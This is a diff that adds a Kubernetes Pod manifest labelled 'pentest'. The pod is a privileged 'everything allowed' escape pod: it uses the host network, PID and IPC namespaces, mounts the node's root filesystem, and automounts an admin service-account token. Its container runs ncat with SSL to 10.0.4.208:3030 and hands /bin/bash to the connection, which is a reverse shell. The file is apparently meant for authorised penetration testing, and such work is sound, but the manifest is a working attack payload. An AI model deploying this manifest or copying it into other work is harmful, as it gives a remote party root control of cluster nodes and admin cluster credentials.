@@ -1,0 +1,27 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: v-pod-1
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  serviceAccountName: sa-admin
+  automountServiceAccountToken: true
+  containers:
+  - name: v-container-1
+    image: raesene/ncat
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "export HOST='10.0.4.208';export PORT='3030';ncat --ssl $HOST $PORT -e /bin/bash" ]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+  nodeName: cap-proj-1
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
